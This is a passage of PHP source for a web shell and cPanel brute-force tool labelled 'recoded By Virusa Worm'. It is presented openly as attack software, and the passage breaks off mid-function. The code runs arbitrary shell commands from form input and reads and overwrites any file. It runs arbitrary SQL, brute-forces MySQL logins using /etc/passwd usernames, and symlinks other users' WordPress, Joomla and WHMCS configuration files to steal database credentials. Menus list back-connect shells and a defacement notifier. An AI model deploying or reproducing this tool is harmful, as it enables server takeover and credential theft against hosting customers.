 foreach($this->rows[$i] as $k=>$v) 
 {
$this->rows[$i][$k] = @addslashes($v);}
 $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');'; }
 break; case 'Oracle': $this->dump[0] = '## ORACLE dump'; $this->dump[] = '## under construction'; break; default: return 0; break; }
 return 1; }
 function close() 
 {
 switch($this->db) 
 {
 case 'MySQL': @mysql_close($this->connection); break; case 'MSSQL': @mssql_close($this->connection); break; case 'PostgreSQL': @pg_close($this->connection); break; case 'Oracle': @oci_close($this->connection); break; }
 }
 function affected_rows() 
 {
 switch($this->db) 
 {
 case 'MySQL': return @mysql_affected_rows($this->res); break; case 'MSSQL': return @mssql_affected_rows($this->res); break; case 'PostgreSQL': return @pg_affected_rows($this->res); break; case 'Oracle': return @ocirowcount($this->res); break; default: return 0; break; }
 }
 }
 if(!empty($_POST['cccc']) && $_POST['cccc']=="download_file" && !empty($_POST['d_name'])) 
 {
 if(!$file=@fopen($_POST['d_name'],"r")) 
 {
 err(1,$_POST['d_name']); $_POST['cccc']=""; }
 else 
 {
 @ob_clean(); $filename = @basename($_POST['d_name']); $filedump = @fread($file,@filesize($_POST['d_name'])); fclose($file); $content_encoding=$mime_type=''; compress($filename,$filedump,$_POST['compress']); if (!empty($content_encoding)) 
 {
 header('Content-Encoding: ' . $content_encoding); }
 header("Content-type: ".$mime_type); header("Content-disposition: attachment; filename=\"".$filename."\";"); echo $filedump; exit(); }
 }
 if(isset($_GET['phpinfo'])) 
 {
 echo @phpinfo(); echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); }
 if (!empty($_POST['cccc']) && $_POST['cccc']=="db_query") 
 {
 echo $head; $sql = new my_sql(); $sql->db = $_POST['db']; $sql->host = $_POST['db_server']; $sql->port = $_POST['db_port']; $sql->user = $_POST['mysql_l']; $sql->pass = $_POST['mysql_p']; $sql->base = $_POST['mysql_db']; $querys = @explode(';',$_POST['db_query']); echo '<body bgcolor=#e4e0d8>'; if(!$sql->connect()) echo "<div align=center><font face=Verdana size=-2 color=red><b>".$sql->error."</b></font></div>"; else 
 {
 if(!empty($sql->base)&&!$sql->select_db()) echo "<div align=center><font face=Verdana size=-2 color=red><b>".$sql->error."</b></font></div>"; else 
 {
 foreach($querys as $num=>$query) 
 {
 if(strlen($query)>5) 
 {
 echo "<font face=Verdana size=-2 color=#777777><b>Query#".$num." : ".htmlspecialchars($query,ENT_QUOTES)."</b></font><br>"; switch($sql->query($query)) 
 {
 case '0': echo "<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>".$sql->error."</b></font></td></tr></table>"; break; case '1': if($sql->get_result()) 
 {
 echo "<table width=100%>"; foreach($sql->columns as $k=>$v) $sql->columns[$k] = htmlspecialchars($v,ENT_QUOTES); $keys = @implode("&nbsp;</b></font></td><td bgcolor=#800000><font face=Verdana size=-2><b>&nbsp;", $sql->columns); echo "<tr><td bgcolor=#800000><font face=Verdana size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>"; for($i=0;$i<$sql->num_rows;$i++) 
 {
 foreach($sql->rows[$i] as $k=>$v) $sql->rows[$i][$k] = htmlspecialchars($v,ENT_QUOTES); $values = @implode("&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;",$sql->rows[$i]); echo '<tr><td><font face=Verdana size=-2>&nbsp;'.$values.'&nbsp;</font></td></tr>'; }
 echo "</table>"; }
 break; case '2': $ar = $sql->affected_rows()?($sql->affected_rows()):('0'); echo "<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>".$ar."</b></font></td></tr></table><br>"; break; }
 }
 }
 }
 }
 echo "<br><title>Cpanel Brute Force recoded By Virusa Worm</title><form name=form method=POST>"; 
 echo in('hidden','db',0,$_POST['db']); echo in('hidden','db_server',0,$_POST['db_server']); echo in('hidden','db_port',0,$_POST['db_port']); echo in('hidden','mysql_l',0,$_POST['mysql_l']); echo in('hidden','mysql_p',0,$_POST['mysql_p']); echo in('hidden','mysql_db',0,$_POST['mysql_db']); echo in('hidden','cccc',0,'db_query'); 
 echo "<div align=center>"; echo "<font face=Verdana size=-2><b>Base: </b><input type=text name=mysql_db value=\"".$sql->base."\"></font><br>"; echo "<textarea cols=65 rows=10 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSELECT * FROM user;"))."</textarea><br><input type=submit name=submit value=\" Run SQL query \"></div><br><br>"; echo "</form>"; echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); }


function ccmmdd($ccmmdd2,$att)
{
global $ccmmdd2,$att;
echo '
<table style="width: 100%" class="style1" dir="rtl">
	<tr>
		<td class="style9"></td>
	</tr>
	<tr>
		<td class="style13">
				<form method="post">
					<select name="att" dir="rtl" style="height: 109px" size="6">
';
if($_POST['att']==null)
{
echo '						<option value="system" selected="">system</option>';
}else{
echo "						<option value='$_POST[att]' selected=''>$_POST[att]</option>
						<option value=system>system</option>
";

						
}

echo '
						<option value="passthru">passthru</option>
						<option value="exec">exec</option>
						<option value="shell_exec">shell_exec</option>	
					</select>
						<input name="page" value="ccmmdd" type="hidden"><br>
						<input dir="ltr" name="ccmmdd2" style="width: 173px" type="text" value="';if(!$_POST['ccmmdd2']){echo 'dir';}else{echo $_POST['ccmmdd2'];}echo '"><br>
						<input type="submit" value="ÊäÝíÐ">
				</form>
		
		</td>
	</tr>
	<tr>
		<td class="style13">
';

		if($_POST[att]=='system')
		{
echo '
					<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
					system($_POST['ccmmdd2']);
echo '					</textarea>';


		}

		if($_POST[att]=='passthru')
		{
echo '
					<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
					passthru($_POST['ccmmdd2']);
echo '					</textarea>';


		}

		



		if($_POST[att]=='exec')
		{

echo '					<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
					exec($_POST['ccmmdd2'],$res);
				echo $res = join("\n",$res); 				
echo '					</textarea>';


		}







		if($_POST[att]=='shell_exec')
		{

echo '					<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
				echo	shell_exec($_POST['ccmmdd2']);
echo '					</textarea>';


		}
echo '		
		</td>
	</tr>
</table>
';

exit;
}

if($_POST['page']=='edit')
{

$code=@str_replace("\r\n","\n",$_POST['code']);
$code=@str_replace('\\','',$code);
$fp = fopen($pathclass, 'w');
fwrite($fp,"$code");
fclose($fp);
echo "<center><b>OK Edit<br><br><br><br><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
exit;
}	

	if($_POST['page']=='show')
	{
	$pathclass =$_POST['pathclass'];
echo '
<form method="POST">
<input type="hidden" name="page" value="edit">
';
	
	$sahacker = fopen($pathclass, "rb");
echo '<center>'.$pathclass.'<br><textarea dir="ltr" name="code" style="width: 845px; height: 404px">';	
$code = fread($sahacker, filesize($pathclass));
echo $code =htmlspecialchars($code);
echo '</textarea>';	
	fclose($sahacker);
echo '
<br><input type="text" name="pathclass" value="'.$pathclass.'" style="width: 445px;">
<br><strong><input type="submit" value="edit file">
</form>
';
		exit;
	}




	if($_POST['page']=='ccmmdd')
	{
	echo ccmmdd($ccmmdd2,$att);
	exit;
	}

if($_POST['page']=='find')
{
if(isset($_POST['usernames']) && isset($_POST['passwords']))
{
    if($_POST['type'] == 'passwd'){
        $e = explode("\n",$_POST['usernames']);
        foreach($e as $value){
        $k = explode(":",$value);
        $username .= $k['0']." ";
        }
    }elseif($_POST['type'] == 'simple'){
        $username = str_replace("\n",' ',$_POST['usernames']);
    }
    $a1 = explode(" ",$username);
    $a2 = explode("\n",$_POST['passwords']);
    $id2 = count($a2);
    $ok = 0;
    foreach($a1 as $user )
    {
        if($user !== '')
        {
        $user=trim($user);
         for($i=0;$i<=$id2;$i++)
         {
            $pass = trim($a2[$i]);
            if(@mysql_connect('localhost',$user,$pass))
            {
                echo "Virusa Worm~ user is (<b><font face='Tahoma' color='#007700' size='2pt'>$user</font></b>) Password is (<b><font face='Tahoma' color='#007700' size='2pt'>$pass</font></b>)<br />";
                $ok++;
            }
         }
        }
    }
    echo "<center><font face='Tahoma' color='#009900' size='2pt'>You Found</font> <b><font face='Tahoma' color='#00ff00' size='2pt'>$ok</font></b> <font face='Tahoma' color='#009900' size='2pt'>Cpanel by Virusa Worm</font></center><br>";
    echo "<center><b><a href=".$_SERVER['PHP_SELF']."><font face='Tahoma' color='#007700' size='2pt'>BACK</font></a>";
    exit;
}
}
echo '<center>
<form method="POST" target="_blank">
<input name="page" type="hidden" value="find">
<table width="600" border="0" cellpadding="3" cellspacing="1" align="center">
<tr>
<td>
<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<td valign="top" bgcolor="transparent" class="style2" style="width: 139px">
<font face="Tahoma" color="#007700" size="2pt">User :</font></td>
<td valign="top" bgcolor="transparent" colspan="5"><font face="Tahoma" color="#007700" size="2pt"><textarea class="area" cols="90" class ="inputz" rows="7" name="usernames"></textarea></td>
</tr>
<tr>
<td valign="top" bgcolor="transparent" class="style2" style="width: 139px">
<font face="Tahoma" color="#007700" size="2pt">Pass :</font></td>
<td valign="top" bgcolor="transparent" colspan="5"><font face="Tahoma" color="#007700" size="2pt"><textarea class="area" cols="90" class ="inputz" rows="7" name="passwords"></textarea></font></td>
</tr>
<tr>
<td valign="top" bgcolor="transparent" class="style2" style="width: 139px">
<font face="Tahoma" color="#007700" size="2pt">Type :</font></td>
<td valign="top" bgcolor="transparent" colspan="5">
<span class="style2"><font face="Tahoma" color="#007700" size="2pt">Simple : </font> </span>
<input type="radio" name="type" value="simple" checked="checked" class="style3">
<font class="style2"><font face="Tahoma" color="#007700" size="2pt">/etc/passwd : </font> </font>
<input type="radio" name="type" value="passwd" class="style3"><span class="style3">
</span>
</td>
</tr>
<tr>
<td valign="top" bgcolor="transparent" style="width: 139px"></td>
<td valign="top" bgcolor="transparent"  colspan="5"><input class ="inputzbut" type="submit" value="start">
</tr>
</td>
<tr>
</form>    
<td valign="top" colspan="6"></td>
<form method="POST" target="_blank">
<input type="hidden" name="go" value="cmd_mysql">
<tr>
<td valign="top" bgcolor="transparent" class="style1" colspan="6"><font face="Tahoma" color="#007700" size="2pt"><br><b>CMD MYSQL</b></font></td>
</tr>
<tr>
<td valign="top" bgcolor="transparent" style="width: 139px"><font face="Tahoma" color="#007700" size="2pt">user</font></td>
<td valign="top" bgcolor="transparent"><font face="Tahoma" color="#007700" size="2pt"><input name="mysql_l" type="text"></font></td>
<td valign="top" bgcolor="transparent"><font face="Tahoma" color="#007700" size="2pt">pass</font></td>
<td valign="top" bgcolor="transparent"><font face="Tahoma" color="#007700" size="2pt"><input name="mysql_p" type="text"></font></td>
<td valign="top" bgcolor="transparent"><font face="Tahoma" color="#007700" size="2pt">database</font></td>
<td valign="top" bgcolor="transparent"><font face="Tahoma" color="#007700" size="2pt"><input name="mysql_db" type="text"></font></td>
</tr>
<tr>
<td valign="top" bgcolor="transparent" style="height: 25px; width: 139px;">
<font face="Tahoma" color="#007700" size="2pt">cmd ~</font></td>
<td valign="top" bgcolor="transparent" colspan="5" style="height: 25px">
<font face="Tahoma" color="#007700" size="2pt">
<br><textarea class="area" name="db_query" cols="90" rows="5">SHOW DATABASES;
SHOW TABLES user_vb ;
SELECT * FROM user;
SELECT version();
SELECT user();</textarea></font></td>
    	</tr>
		<tr>
    <td valign="top" bgcolor="transparent" style="width: 139px"><strong></strong></td>
    <td valign="top" bgcolor="transparent" colspan="5"><strong><input type="submit" value="run"></strong></td>
    	</tr>
<input name="db" value="MySQL" type="hidden">
<input name="db_server" type="hidden" value="localhost">
<input name="db_port" type="hidden" value="3306">
<input name="cccc" type="hidden" value="db_query">
    	
</form>    	
		<tr>
    <td valign="top" bgcolor="transparent" colspan="6"><strong></strong></td>


		</tr>
		
<form method="POST" target="_blank">
		<tr>
    <td valign="top" bgcolor="transparent" class="style1" colspan="6"><font face="Tahoma" color="#007700" size="2pt"><br><b>CMD 
	system - passthru - exec - shell_exec</b></font></td>
    				</tr>
		<tr>
    <td valign="top" bgcolor="transparent" style="width: 139px"><font face="Tahoma" color="#007700" size="2pt">cmd ~</font></td>
    <td valign="top" bgcolor="transparent" colspan="5">
					<select name="att" dir="rtl"  size="1"></center>
';
if($_POST['att']==null)
{
echo '						<option value="system" selected="">system</option>';
}else{
echo "						<option value='$_POST[att]' selected=''>$_POST[att]</option>
						<option value=system>system</option>
";

						
}
echo '<option value="passthru">passthru</option>
						<option value="exec">exec</option>
						<option value="shell_exec">shell_exec</option>
					</select>    

<input name="page" type="hidden" value="ccmmdd">    
	<input name="ccmmdd2" type="text" style="width: 284px" value="ls -la"></td>
    	</tr>
		<tr>
    <td valign="top" bgcolor="transparent" style="width: 139px"></td>
    <td valign="top" bgcolor="transparent" colspan="5"><input type="submit" value="go"></td>
    	</tr>
</form>    	    	

<form method="POST" target="_blank">

		<tr>
    <td valign="top" bgcolor="transparent" class="style1" colspan="6"><font face="Tahoma" color="#007700" size="2pt"><br><b>Show 
	File And Edit</b></font></td>
    				</tr>
		<tr>
    <td valign="top" bgcolor="transparent" style="width: 139px"><font face="Tahoma" color="#007700" size="2pt">Path ~</font></td>
    <td valign="top" bgcolor="transparent" colspan="5">
	
	<input name="pathclass" type="text" style="width: 284px" value="/home/path/"></td>
    	</tr>
		<tr>
    <td valign="top" bgcolor="transparent" style="width: 139px"></td>
    <td valign="top" bgcolor="transparent" colspan="5"><input type="submit" value="show"></td>
    				</tr>
<input name="page" type="hidden" value="show">        				
</form>    				
					<tr>
    <td valign="top" bgcolor="transparent" class="style1" colspan="6"><font face="Tahoma" color="#007700" size="2pt"><br><b>Info 
	Security</b></font></td>
    				</tr>
    	<tr>
    <td valign="top" bgcolor="transparent" style="width: 139px"><font face="Tahoma" color="#007700" size="2pt">Safe Mode</font></td>
    <td valign="top" bgcolor="transparent" colspan="5">
	<font face="Tahoma" color="#007700" size="2pt">';
	$safe_mode = ini_get('safe_mode');
if($safe_mode=='1')
{
echo '<b><font face="Tahoma" color="#ff0000" size="2pt">ON</font></b>';
}else{
echo '<b><font face="Tahoma" color="#b0b000" size="2pt">OFF</font></b>';
}
echo '</font>	
	</td>
    				</tr>
    <tr>
    <td valign="top" bgcolor="transparent" style="width: 139px"><font face="Tahoma" color="#007700" size="2pt">Function</font></td>
    <td valign="top" bgcolor="transparent" colspan="5">
	';
	if(''==($func=@ini_get('disable_functions')))
{
echo "<b><font face='Tahoma' color='#b0b000' size='2pt'>&nbsp;No Security for Function</font></b>";
}else{
echo '<script>alert("Please see below and press >Please Click Here First!");</script>';
        echo '<b><font face="Tahoma" color="#ff0000" size="2pt">$func</font></b>';
        echo '<tr><td valign="top" bgcolor="#151515" style="width: 139px"></td>';
        echo '<td valign="top" bgcolor="#151515" colspan="5"><input type="submit" value="Please Click Here First!">
    
    </td></tr>';
	
    }
	echo '
    <tr>
    <td valign="top" bgcolor="transparent" style="width: 139px"></td>
    <td valign="top" bgcolor="transparent" colspan="5"></td>
    </table>
    </td>
    </tr>
    </table>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8"></head><body></body></html>
<form style="border: 0px ridge #FFFFFF">
    <p align="center"></td>
  </tr><div align="center">
                <tr>
<input type="submit"   name="user" value="Generate User"><option value="name"></select>
</form>
<div align="center">
 <table border="0" width="10%" bordercolorlight="#007700" bordercolordark="#007700" height="100" cellspacing="5">
<tr>
<td bordercolorlight="#007700" bordercolordark="#007700">
<p align="left">
<textarea  class="area" method="POST" rows="10" name="S1" cols="96">';
if ($_GET['user'] )


      system('ls /var/mail');





                                           for($uid=0;$uid<90000;$uid++){

                                        }
										
echo '</textarea>';
}
if(isset($_GET['action']) && $_GET['action'] == 'jmbru'){
echo '<center><b class="conte">
<a href="?action=skybru">Skype Brute Force</a> -
<a href="?action=cpbru">Cpanel Brute Force</a> -
<a href="?action=jmbru">Joomla Brute Force</a> -
<a href="?action=wpbru">Wordpress Brute Force</a> -
<a href="?action=twbru">Twitter Brute Force</a> -
<a href="?action=ghbru">Gmail & Hotmail Brute Force</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Joomla Brute Force</span></center><br>';
echo '<font face="Tahoma" color="#007700" size="2pt"><form action="?y=<?php echo $pwd; ?><?php echo $pwd; ?><?php if (empty($_POST['config'])) { ?><?php echo file_get_contents('/etc/passwd'); ?><?php }if ($_POST['config']) {$function = $functions=@ini_get("disable_functions");if(eregi("symlink",$functions)){die ('<error>Symlink is disabled :( </error>');}@mkdir('vwconfig', 0755);@chdir('vwconfig');
$htaccess="
OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI
Options Indexes FollowSymLinks
ForceType text/plain
AddType text/plain .php 
AddType text/plain .html
AddType text/html .shtml
AddType txt .php
AddHandler server-parsed .php
AddHandler txt .php
AddHandler txt .html
AddHandler txt .shtml
Options All
Options All";
file_put_contents(".htaccess",$htaccess,FILE_APPEND);$passwd=$_POST["passwd"];$passwd=explode("\n",$passwd);echo "<br><br><center><font color=#b0b000 size=2pt>wait ...</center><br>";foreach($passwd as $pwd){$pawd=explode(":",$pwd);$user =$pawd[0];@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-wp13.txt');@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-wp13-wp.txt');@symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-wp13-WP.txt');@symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$user.'-wp13-wp-beta.txt');@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp13-beta.txt');@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-wp13-press.txt');@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-wp13-wordpress.txt');@symlink('/home/'.$user.'/public_html/Wordpress/wp-config.php',$user.'-wp13-Wordpress.txt');@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp13-Wordpress.txt');@symlink('/home/'.$user.'/public_html/config.php',$user.'-configgg.txt');@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-wp13-news.txt');@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-wp13-new.txt');@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp-blog.txt');@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp-beta.txt');@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-wp-blogs.txt');@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-wp-home.txt');@symlink('/home/'.$user.'/public_html/db.php',$user.'-dbconf.txt');@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-wp-site.txt');@symlink('/home/'.$user.'/public_html/main/wp-config.php',$user.'-wp-main.txt');@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-wp-test.txt');@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-joomla2.txt');@symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-joomla-protal.txt');@symlink('/home/'.$user.'/public_html/joo/configuration.php',$user.'-joo.txt');@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-joomla-cms.txt');@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-joomla-site.txt');@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-joomla-main.txt');@symlink('/home/'.$user.'/public_html/news/configuration.php',$user.'-joomla-news.txt');@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-joomla-new.txt');@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-joomla-home.txt');@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vb-config.txt');@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm15.txt');@symlink('/home/'.$user.'/public_html/central/configuration.php',$user.'-whm-central.txt');@symlink('/home/'.$user.'/public_html/whm/whmcs/configuration.php',$user.'-whm-whmcs.txt');@symlink('/home/'.$user.'/public_html/whm/WHMCS/configuration.php',$user.'-whm-WHMCS.txt');@symlink('/home/'.$user.'/public_html/whmc/WHM/configuration.php',$user.'-whmc-WHM.txt');@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-whmcs.txt');@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-support.txt');@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-joomla.txt');@symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-whmcs2.txt');@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm.txt');}echo '<b class="cone"><font face="Tahoma" color="#00dd00" size="2pt"><b>Done -></b> <a target="_blank" href="vwconfig">Open configs</a></font></b>';}
}
if(isset($_GET['action']) && $_GET['action'] == 'cari'){
echo '<center><b class="conte">
<a href="?action=mysqslsls">MySQL & PostgreSql Connect</a> -
<a href="?action=cmd">Command Execution</a> -
<a href="?action=com64">Base64 Command</a> -
<a href="?action=vgrab">Config Grabber</a> -
<a href="?action=subdomainchkrezes">Subdomain Checker</a> -
<a href="?action=joomlarvrssrvetll">Joomla Reverse Server</a> -    
<a href="?action=wordddprssrrrvrse">Wordpress Reverse Server</a> -
<a href="?action=cari">Find Directory Writable/Readable</a> -
<a href="?action=zonh">Zone-h Notifier</a> -
<a href="?action=shhhshell">Shtml Command Shell</a> -
<a href="?action=beko">Back connect Simple</a> -
<a href="?action=rubybckconnnect">Ruby BackConnect</a> -
<a href="?action=prlbckacnonect">Perl BackConnect</a> -
<a href="?action=pythnonbakcncete">Python BackConnect</a> -
<a href="?action=exploit">Exploit</a> -
<a href="?action=whmcskillrer">Whcms Killer</a> -
<a href="?action=webmllllpwdchnger">Webmail Password Changer</a> -
<a href="?action=wpcdrfex">Wordpress Csrf Exploit</a>
</center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Find Directory Writable/Readable</span></center><br><br>'.$end; function read_dir($path) { global $count; if ($handle = opendir($path)) { while (false !== ($file = readdir($handle))) { $dr="$path$file/"; if (($file!='.') and ($file!='..') and is_dir($dr)) { if (is_readable($dr) and is_writeable($dr)) { echo "[RW] " . $dr . "<br>\n\r"; $count++; } read_dir($dr); }}}} $count=0; set_time_limit(0); @$passwd=fopen('/etc/passwd','r'); if (!$passwd) { echo "<br><center><font color='#ff0000' size='2pt' />[-] No Access to /etc/passwd\n\r</center>"; exit;} $path_to_public=array(); echo "<html><center><table style='margin: 0 auto;'><tr valign='top'><td align='left'><font color='#007700' size='2pt' />\n\r"; while(!feof($passwd)) { $str=fgets($passwd); $pos=strpos($str,":"); $username=substr($str,0,$pos); $dirz="/home/$username/public_html/"; if (($username!="")) { if (is_readable($dirz)) { array_push($path_to_public,$dirz); if (is_writeable($dirz)) { $count++; echo "<font color=white>[</font><font color=yellow>R</font><font color=green>W</font><font color=white>]</font> " . $dirz . "<br><br><br>\n\r";} else echo "<font color=white>[</font><font color=yellow>R</font><font color=white>]</font> " . $dirz . "<br>\n\r"; }}} echo "<br><br><font color=white size=2pt>[+]</font> <font color=#00dd00 size=2pt>Found </font><font color=yellow size=2pt>" . sizeof($path_to_public) . "</font> <font color=#00dd00 size=2pt>readable public_html directories.</font><br><br>\n\r\n\r"; if (sizeof($path_to_public) != '0') { foreach ($path_to_public as $path) { } echo "<font color=white size=2pt>[+]</font> <font color=#00dd00 size=2pt>Found</font><font color=yellow size=2pt> " . $count . " </font><font color=#00dd00 size=2pt>writable directories.</font>\n\r"; echo "</td></tr></table></center></html>";
}

}
if(isset($_GET['action']) && $_GET['action'] == 'mysqslsls'){
echo '<center><b class="conte">
<a href="?action=mysqslsls">MySQL & PostgreSql Connect</a> -
<a href="?action=cmd">Command Execution</a> -
<a href="?action=com64">Base64 Command</a> -
<a href="?action=vgrab">Config Grabber</a> -
<a href="?action=subdomainchkrezes">Subdomain Checker</a> -
<a href="?action=joomlarvrssrvetll">Joomla Reverse Server</a> -    
<a href="?action=wordddprssrrrvrse">Wordpress Reverse Server</a> -
<a href="?action=cari">Find Directory Writable/Readable</a> -
<a href="?action=zonh">Zone-h Notifier</a> -
<a href="?action=shhhshell">Shtml Command Shell</a> -
<a href="?action=beko">Back connect Simple</a> -
<a href="?action=rubybckconnnect">Ruby BackConnect</a> -
<a href="?action=prlbckacnonect">Perl BackConnect</a> -
<a href="?action=pythnonbakcncete">Python BackConnect</a> -
<a href="?action=exploit">Exploit</a> -
<a href="?action=whmcskillrer">Whcms Killer</a> -
<a href="?action=webmllllpwdchnger">Webmail Password Changer</a> -
<a href="?action=wpcdrfex">Wordpress Csrf Exploit</a>
</center>
</b>';
echo"<br><center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>MySQL & PostgreSql Connect</span><br><div class=content> 
<form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr> 
<td><font face='Tahoma' color='#007700' size='2pt' />Type</td><td><font face='Tahoma' color='#007700' size='2pt' />Host</td><td><font face='Tahoma' color='#007700' size='2pt' />Login</td><td><font face='Tahoma' color='#007700' size='2pt' />Password</td><td><font face='Tahoma' color='#007700' size='2pt' />Database</td><td></td></font></tr><tr> 
<input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='". htmlspecialchars($GLOBALS['cwd']) ."'><input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'') ."'> 
<center><td><select name='type'><option value='mysql' "; 
if(@$_POST['type']=='mysql')echo 'selected'; 
echo ">MySql</option><option value='pgsql' "; 
if(@$_POST['type']=='pgsql')echo 'selected'; 
echo ">PostgreSql</option></select></td> 
<td><input type=text name=sql_host value='". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."'></td> 
<td><input type=text name=sql_login value='". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) ."'></td> 
<td><input type=text name=sql_pass value='". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."'></td><td>"; 
$tmp = "<input type=text name=sql_base value=''>"; 
if(isset($_POST['sql_host'])){ 
if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) { 
switch($_POST['charset']) { 
case "Windows-1251": $db->setCharset('cp1251'); break; 
case "UTF-8": $db->setCharset('utf8'); break; 
case "KOI8-R": $db->setCharset('koi8r'); break; 
case "KOI8-U": $db->setCharset('koi8u'); break; 
case "cp866": $db->setCharset('cp866'); break; 
} 
$db->listDbs(); 
echo "<select name=sql_base><option value=''></option>"; 
while($item = $db->fetch()) { 
list($key, $value) = each($item); 
echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>'; 
} 
echo '</select>'; 
} 
else echo $tmp; 
}else
echo $tmp; 
echo "</td> 
  
<td><input type=submit value='>>' onclick='fs(d.sf);'></td> 
<td><input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count'])?'':' checked') . "> <font face='Tahoma' color='#007700' size='2pt' />count the number of rows</td></center> <br>
</tr> 
</table> <br>
<script> 
s_db='".@addslashes($_POST['sql_base'])."'; 
function fs(f) { 
if(f.sql_base.value!=s_db) { f.onsubmit = function() {}; 
if(f.p1) f.p1.value=''; 
if(f.p2) f.p2.value=''; 
if(f.p3) f.p3.value=''; 
} 
} 
function st(t,l) { 
d.sf.p1.value = 'select'; 
d.sf.p2.value = t; 
if(l && d.sf.p3) d.sf.p3.value = l; 
d.sf.submit(); 
} 
function is() { 
for(i=0;i<d.sf.elements['tbl[]'].length;++i) 
d.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked; 
} 
</script>"; 
if(isset($db) && $db->link){ 
echo "<br/><table width=100% cellpadding=2 cellspacing=0>"; 
if(!empty($_POST['sql_base'])){ 
$db->selectdb($_POST['sql_base']); 
echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>"; 
$tbls_res = $db->listTables(); 
while($item = $db->fetch($tbls_res)) { 
list($key, $value) = each($item); 
if(!empty($_POST['sql_count'])) 
$n = $db->fetch($db->query('SELECT COUNT(*) as n FROM '.$value.'')); 
$value = htmlspecialchars($value); 
echo "<nobr><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a href=# onclick=\"st('".$value."',1)\">".$value."</a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small>({$n['n']})</small>") . "</nobr><br>"; 
} 
echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>"; 
if(@$_POST['p1'] == 'select') { 
$_POST['p1'] = 'query'; 
$_POST['p3'] = $_POST['p3']?$_POST['p3']:1; 
$db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']); 
$num = $db->fetch(); 
$pages = ceil($num['n'] / 30); 
echo "<script>d.sf.onsubmit=function(){st(\"" . $_POST['p2'] . "\", d.sf.p3.value)}</script><span>".$_POST['p2']."</span> ({$num['n']} records) Page # <input type=text name='p3' value=" . ((int)$_POST['p3']) . ">"; 
echo " of $pages"; 
if($_POST['p3'] > 1) 
echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']-1) . ")'>&lt; Prev</a>"; 
if($_POST['p3'] < $pages) 
echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']+1) . ")'>Next &gt;</a>"; 
$_POST['p3']--; 
if($_POST['type']=='pgsql') 
